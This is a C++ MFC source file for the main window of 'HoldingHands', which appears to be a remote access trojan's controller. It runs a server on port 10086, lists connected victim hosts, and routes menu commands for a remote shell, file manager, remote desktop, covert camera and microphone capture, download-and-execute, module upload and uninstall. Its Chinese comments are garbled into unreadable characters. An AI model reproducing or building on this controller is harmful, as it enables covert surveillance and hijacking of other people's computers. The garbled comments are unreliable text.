
// MainFrm.cpp : CMainFrame ���ʵ��
//

#include "stdafx.h"
#include "HoldingHands.h"
#include "IOCPServer.h"
#include "MainFrm.h"
#include "Manager.h"
#include "ClientContext.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

// CMainFrame

IMPLEMENT_DYNAMIC(CMainFrame, CFrameWnd)

BEGIN_MESSAGE_MAP(CMainFrame, CFrameWnd)
	ON_WM_CREATE()
	ON_WM_SETFOCUS()
	ON_WM_PAINT()
	ON_COMMAND(ID_VIEW_CLIENTLIST, &CMainFrame::OnViewClientlist)
	ON_COMMAND(ID_VIEW_LOG, &CMainFrame::OnViewLog)
	ON_UPDATE_COMMAND_UI(ID_VIEW_CLIENTLIST, &CMainFrame::OnUpdateViewClientlist)
	ON_UPDATE_COMMAND_UI(ID_VIEW_LOG, &CMainFrame::OnUpdateViewLog)
	ON_WM_TIMER()
	ON_COMMAND(ID_MAIN_STARTSERVER, &CMainFrame::OnMainStartserver)
	ON_UPDATE_COMMAND_UI(ID_MAIN_STARTSERVER, &CMainFrame::OnUpdateMainStartserver)

	ON_MESSAGE(WM_IOCPSVR_START, OnSvrStarted)
	ON_MESSAGE(WM_IOCPSVR_CLOSE, OnSvrStopped)

	//����Handler����
	ON_MESSAGE(WM_SOCKET_CONNECT,OnSocketConnect)
	ON_MESSAGE(WM_SOCKET_CLOSE, OnSocketClose)
	//ON_MESSAGE()
	ON_WM_CLOSE()
	ON_COMMAND(ID_MAIN_EXIT, &CMainFrame::OnMainExit)
	//����MainFrame�����ʼ���ǻ�ɫ��.
	ON_COMMAND(ID_SESSION_DISCONNECT, &CMainFrame::OnSessionDisconnect)
	ON_COMMAND(ID_SESSION_UNINSTALL, &CMainFrame::OnSessionUninstall)
	ON_COMMAND(ID_POWER_SHUTDOWN, &CMainFrame::OnPowerShutdown)
	ON_COMMAND(ID_POWER_REBOOT, &CMainFrame::OnPowerReboot)
	ON_COMMAND(ID_OPERATION_EDITCOMMENT, &CMainFrame::OnOperationEditcomment)
	ON_COMMAND(ID_UPLOADMODULE_FROMDISK, &CMainFrame::OnUploadmoduleFromdisk)
	ON_COMMAND(ID_UPLOADMODULE_FROMURL, &CMainFrame::OnUploadmoduleFromurl)
	ON_UPDATE_COMMAND_UI(ID_MAIN_EXIT, &CMainFrame::OnUpdateMainExit)
	ON_COMMAND(ID_OPERATION_CMD, &CMainFrame::OnOperationCmd)
	ON_COMMAND(ID_OPERATION_CHATBOX, &CMainFrame::OnOperationChatbox)
	ON_COMMAND(ID_OPERATION_FILEMANAGER, &CMainFrame::OnOperationFilemanager)
	ON_COMMAND(ID_OPERATION_REMOTEDESKTOP, &CMainFrame::OnOperationRemotedesktop)
	ON_COMMAND(ID_OPERATION_CAMERA, &CMainFrame::OnOperationCamera)
	ON_COMMAND(ID_SESSION_RESTART, &CMainFrame::OnSessionRestart)
	ON_COMMAND(ID_OPERATION_MICROPHONE, &CMainFrame::OnOperationMicrophone)
	ON_COMMAND(ID_OPERATION_DOWNLOADANDEXEC, &CMainFrame::OnOperationDownloadandexec)
END_MESSAGE_MAP()

static UINT indicators[] =
{
	ID_SERVER_STATU,
	ID_HOST_COUNT,
	ID_HOST_SELECTED,
	ID_UPLOAD_SPEED,
	ID_DOWNLOAD_SPEED,
	ID_CUR_DATE
};

// CMainFrame ����/����

CMainFrame::CMainFrame()
{
	// TODO:  �ڴ���ӳ�Ա��ʼ������
	m_View = 0;
	m_pServer = NULL;
	m_bExitAfterStop = FALSE;
}

CMainFrame::~CMainFrame()
{
}

wchar_t* wszSvrStatu[] =
{
	L"Starting",
	L"Started",
	L"Stopping",
	L"Stopped",
};

int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
{
	if (CFrameWnd::OnCreate(lpCreateStruct) == -1)
		return -1;
	RECT rect = { 0 };
	//����״̬��
	if (!m_wndStatusBar.Create(this))
	{
		TRACE0("δ�ܴ���StatuBar\n");
		return -1;      // δ�ܴ���
	}
	m_wndStatusBar.SetIndicators(indicators, sizeof(indicators) / sizeof(UINT));
	m_wndStatusBar.SetPaneInfo(0, ID_SERVER_STATU, SBPS_STRETCH, 0);
	m_wndStatusBar.SetPaneInfo(1, ID_HOST_COUNT, SBPS_NORMAL, 120);
	m_wndStatusBar.SetPaneInfo(2, ID_HOST_SELECTED, SBPS_NORMAL, 120);
	m_wndStatusBar.SetPaneInfo(3, ID_UPLOAD_SPEED, SBPS_NORMAL, 160);
	m_wndStatusBar.SetPaneInfo(4, ID_DOWNLOAD_SPEED, SBPS_NORMAL, 160);
	m_wndStatusBar.SetPaneInfo(5, ID_CUR_DATE, SBPS_NORMAL, 160);

	//�����ͻ����б�
	if (!m_ClientList.Create(WS_CHILD | WS_VISIBLE | WS_BORDER | LVS_REPORT,
		rect, this, NULL))
	{
		TRACE0("δ�ܴ���ClientList\n");
		return -1;      // δ�ܴ���
	}
	//����Log
	if (!m_Log.Create(WS_HSCROLL | WS_VSCROLL | ES_WANTRETURN | ES_MULTILINE | WS_VISIBLE | WS_CHILD, rect, this, NULL))
	{
		TRACE0("δ�ܴ���Log\n");
		return -1;      // δ�ܴ���
	}
	m_LogFont.CreateFontW(16, 8, 0, 0, FW_THIN, FALSE, FALSE, 0, DEFAULT_CHARSET, DEFAULT_CHARSET,
		CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_SCRIPT, L"consolas");
	m_Log.SetFont(&m_LogFont);

	m_View |= (VIEW_SHOW_CLIENLIST | VIEW_SHOE_LOG);

	m_ServerStatu = SVR_STATU_STOPPED;

	//����������
	CIOCPServer::SocketInit();
	m_pServer = CIOCPServer::CreateServer(m_hWnd);
	
	//����ˢ�����ݵļ�ʱ��
	SetTimer(10086, 1000, NULL);

	Log(L"Welcome to HoldingHands!");
	return 0;
}

BOOL CMainFrame::PreCreateWindow(CREATESTRUCT& cs)
{
	if( !CFrameWnd::PreCreateWindow(cs) )
		return FALSE;
	// TODO:  �ڴ˴�ͨ���޸�
	//  CREATESTRUCT cs ���޸Ĵ��������ʽ

	cs.style |= (CS_HREDRAW | CS_VREDRAW);

	cs.dwExStyle &= ~WS_EX_CLIENTEDGE;
	cs.lpszClass = AfxRegisterWndClass(0);
	cs.lpszName = L"[HoldingHands]";
	
	return TRUE;
}

// CMainFrame ���

#ifdef _DEBUG
void CMainFrame::AssertValid() const
{
	CFrameWnd::AssertValid();
}

void CMainFrame::Dump(CDumpContext& dc) const
{
	CFrameWnd::Dump(dc);
}
#endif //_DEBUG


// CMainFrame ��Ϣ�������

void CMainFrame::OnSetFocus(CWnd* /*pOldWnd*/)
{
	
}
void CMainFrame::OnPaint()
{
	CPaintDC dc(this); // device context for painting
	// TODO:  �ڴ˴������Ϣ����������
	// ��Ϊ��ͼ��Ϣ���� CFrameWnd::OnPaint()
	RECT rect;
	RECT StatuBarRect;

	GetClientRect(&rect);
	m_wndStatusBar.GetClientRect(&StatuBarRect);
	if (!(m_View & VIEW_SHOW_CLIENLIST) && !(m_View & VIEW_SHOW_CLIENLIST))
	{
		//����������ڶ�����ʾ�ٻ��Ʊ���
		COLORREF color = 0x00FFFFFF;
		CBrush Brush(color);
		dc.FillRect(&rect, &Brush);
	}
	// �������ڴ�С
	if (m_View&VIEW_SHOW_CLIENLIST)
	{	
		GetClientRect(&rect);
		if (m_View&VIEW_SHOE_LOG)
			rect.bottom -= 200;
		else
			rect.bottom -= (StatuBarRect.bottom - StatuBarRect.top);
		m_ClientList.MoveWindow(&rect);
		m_ClientList.ShowWindow(SW_SHOW);
	}
	else
		m_ClientList.ShowWindow(SW_HIDE);

	if (m_View&VIEW_SHOE_LOG)
	{
		GetClientRect(&rect);
		rect.top = rect.bottom - 200;
		rect.bottom -= (StatuBarRect.bottom - StatuBarRect.top);
		if ((m_View&VIEW_SHOW_CLIENLIST) == 0)
			rect.top = 0;
		m_Log.MoveWindow(&rect);
		m_Log.ShowWindow(SW_SHOW);
	}
	else
		m_Log.ShowWindow(SW_HIDE);
}


void CMainFrame::OnViewClientlist()
{
	RECT rect;
	GetClientRect(&rect);
	m_View = (m_View & (~VIEW_SHOW_CLIENLIST)) | ((~(m_View&VIEW_SHOW_CLIENLIST))&VIEW_SHOW_CLIENLIST);
	InvalidateRect(&rect);
}


void CMainFrame::OnViewLog()
{
	RECT rect;
	GetClientRect(&rect);
	m_View = (m_View & (~VIEW_SHOE_LOG)) | ((~(m_View&VIEW_SHOE_LOG))&VIEW_SHOE_LOG);
	InvalidateRect(&rect);
}


void CMainFrame::OnUpdateViewClientlist(CCmdUI *pCmdUI)
{
	pCmdUI->SetCheck(m_View&VIEW_SHOW_CLIENLIST);
}


void CMainFrame::OnUpdateViewLog(CCmdUI *pCmdUI)
{
	pCmdUI->SetCheck(m_View&VIEW_SHOE_LOG);
}

void CMainFrame::OnUpdateStatuBar()
{
	//����ʱ��
	CString PaneText;
	CTime time = CTime::GetTickCount();
	PaneText = time.Format("[%Y-%m-%d %H:%M:%S]");
	m_wndStatusBar.SetPaneText(5, PaneText);
	//�����ϴ�,�����ٶ�.
	DWORD UpSpeed = 0, DoSpeed = 0;
	if (m_pServer)
	{
		UpSpeed = m_pServer->GetWriteSpeed();
		DoSpeed = m_pServer->GetReadSpeed();
	}
	PaneText.Format(L"Upload: %dKB/S", UpSpeed);
	m_wndStatusBar.SetPaneText(3, PaneText);

	PaneText.Format(L"Download: %dKB/s", DoSpeed);
	m_wndStatusBar.SetPaneText(4, PaneText);

	//HostCount
	PaneText.Format(L"Host: %d", m_ClientList.GetItemCount());
	m_wndStatusBar.SetPaneText(1, PaneText);
	//Selected Count
	PaneText.Format(L"Selected: %d", m_ClientList.GetSelectedCount());
	m_wndStatusBar.SetPaneText(2, PaneText);
	//ServerStatu

	PaneText.Format(L"SrvStatu: %s", wszSvrStatu[m_ServerStatu]);
	m_wndStatusBar.SetPaneText(0, PaneText);
}
void CMainFrame::OnTimer(UINT_PTR nIDEvent)
{
	// TODO:  �ڴ������Ϣ�����������/�����Ĭ��ֵ
	//
	switch (nIDEvent)
	{
	case 10086:
		OnUpdateStatuBar();
		break;
	default:
		break;
	}
	CFrameWnd::OnTimer(nIDEvent);
}


void CMainFrame::OnMainStartserver()
{
	// TODO:  �ڴ���������������
	if (m_ServerStatu == SVR_STATU_STARTED)
	{
		m_ServerStatu = SVR_STATU_STOPPING;
		//�Ƴ����пͻ���
		m_ClientList.DeleteAllItems();
		m_pServer->AsyncStopSvr();
	}
	if (m_ServerStatu == SVR_STATU_STOPPED)
	{
		m_ServerStatu = SVR_STATU_STARTING;
		m_pServer->AsyncStartSvr(10086);
	}
}


void CMainFrame::OnUpdateMainStartserver(CCmdUI *pCmdUI)
{
	// TODO:  �ڴ������������û����洦��������
	switch (m_ServerStatu)
	{
	case SVR_STATU_STARTED:
		pCmdUI->SetText(L"Stop");
		pCmdUI->Enable();
		break;
	case SVR_STATU_STARTING:
		pCmdUI->SetText(L"Starting");
		pCmdUI->Enable(0);
		break;
	case SVR_STATU_STOPPED:
		pCmdUI->SetText(L"Start");
		pCmdUI->Enable();
		break;
	case SVR_STATU_STOPPING:
		pCmdUI->SetText(L"Stopping");
		pCmdUI->Enable(0);
		break;
	}
}

void CMainFrame::OnMainExit()
{
	// TODO:  �ڴ���������������
	CMainFrame::OnClose();
}

void CMainFrame::OnClose()
{
	if (IDYES != MessageBox(L"Are you sure?", L"Exit", MB_YESNO))
		return;
	//�رշ�����.(����Ѿ��ر���Ҳû��,Ҳ�����֪ͨ��)
	m_ServerStatu = SVR_STATU_STOPPING;
	m_bExitAfterStop = TRUE;
	m_pServer->AsyncStopSvr();
}



/*****************************************************************************************************
					��������֪ͨ
******************************************************************************************************/
LRESULT CMainFrame::OnSvrStarted(WPARAM wParam,LPARAM lParam)
{
	if (wParam == 0)
	{
		Log(L"Start Server Failed!");
		m_ServerStatu = SVR_STATU_STOPPED;
	}
	else
	{
		Log(L"Server is Running.");
		m_ServerStatu = SVR_STATU_STARTED;
	}
	return 0;
}

LRESULT CMainFrame::OnSvrStopped(WPARAM wParam, LPARAM lParam)
{
	m_ServerStatu = SVR_STATU_STOPPED;
	Log(L"Server has stopped.");
	//�˳�����
	if (m_bExitAfterStop)
	{
		//��������һЩ����Ĺ���
		CIOCPServer::DeleteServer();
		m_pServer = NULL;
		KillTimer(10086);
		//clean:


		
		DestroyWindow();
	}
	return 0;
}

/*************************************************************************
								*��־��¼
**************************************************************************/
void CMainFrame::Log(CString text)
{
	CTime time = CTime::GetTickCount();
	CString LogText;
	LogText = time.Format("[%Y-%m-%d %H:%M:%S]: ");
	LogText += text;
	LogText += "\r\n";
	m_Log.SetSel(-1);
	m_Log.ReplaceSel(LogText);
}



/********************************************************************************
							** ����Handler���� **
	��socket��һ�����ӵ�ʱ��,�����Identity ����һ��Handler,���ڿ����漰����,������
	���߳�����ִ�г�ʼ������

********************************************************************************/

LRESULT CMainFrame::OnSocketConnect(WPARAM wParam, LPARAM lParam)
{
	CString Text;
	CClientContext*pContext = (CClientContext*)wParam;

	char Addr[32];
	USHORT Port;
	pContext->GetPeerName(Addr, Port);
	ULONGLONG szIdentity = lParam;
	Text.Format(L"Socket Connect [Identity: %s  Addr: %s:%d]", CA2W((char*)&szIdentity).m_szBuffer, CA2W(Addr).m_szBuffer, Port);

	Log(Text);
	return CManager::HandlerInit(pContext, lParam);
}

LRESULT CMainFrame::OnSocketClose(WPARAM wParam, LPARAM lParam)
{
	CString Text;
	CClientContext*pContext = (CClientContext*)wParam;

	char Addr[32];
	USHORT Port;
	pContext->GetPeerName(Addr, Port);
	ULONGLONG szIdentity = lParam;
	Text.Format(L"Socket closed  [Identity: %s  Addr: %s:%d]", CA2W((char*)&szIdentity).m_szBuffer, CA2W(Addr).m_szBuffer, Port);

	Log(Text);
	return CManager::HandlerTerm(pContext, lParam);
}

//����MainFrame�������Ϣӳ��,�˵�ʼ���ǻ�ɫ��mmp.
void CMainFrame::OnSessionDisconnect(){
	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_SESSION_DISCONNECT, 0);
}
void CMainFrame::OnSessionUninstall(){
	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_SESSION_UNINSTALL, 0);
}
void CMainFrame::OnPowerShutdown(){
	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_POWER_SHUTDOWN, 0);
}
void CMainFrame::OnPowerReboot(){
	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_POWER_REBOOT, 0);
}
void CMainFrame::OnOperationEditcomment(){
	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_OPERATION_EDITCOMMENT, 0);
}


void CMainFrame::OnUploadmoduleFromdisk(){
	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_UPLOADMODULE_FROMDISK, 0);
}


void CMainFrame::OnUploadmoduleFromurl(){
	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_UPLOADMODULE_FROMURL, 0);
}


void CMainFrame::OnUpdateMainExit(CCmdUI *pCmdUI)
{
	// TODO:  �ڴ������������û����洦��������
	pCmdUI->Enable(!(m_ServerStatu == SVR_STATU_STOPPING));
}


void CMainFrame::OnOperationCmd()
{
	// TODO:  �ڴ���������������
	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_OPERATION_CMD, 0);
}


void CMainFrame::OnOperationChatbox()
{
	// TODO:  �ڴ���������������
	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_OPERATION_CHATBOX, 0);
}

void CMainFrame::OnOperationFilemanager()
{
	// TODO:  �ڴ���������������
	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_OPERATION_FILEMANAGER, 0);
}


void CMainFrame::OnOperationRemotedesktop()
{
	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_OPERATION_REMOTEDESKTOP, 0);
}


void CMainFrame::OnOperationCamera()
{
	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_OPERATION_CAMERA, 0);
}


void CMainFrame::OnSessionRestart()
{
	// TODO:  �ڴ���������������
	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_SESSION_RESTART, 0);
}


void CMainFrame::OnOperationMicrophone()
{
	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_OPERATION_MICROPHONE, 0);
}


void CMainFrame::OnOperationDownloadandexec()
{
	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_OPERATION_DOWNLOADANDEXEC, 0);
}
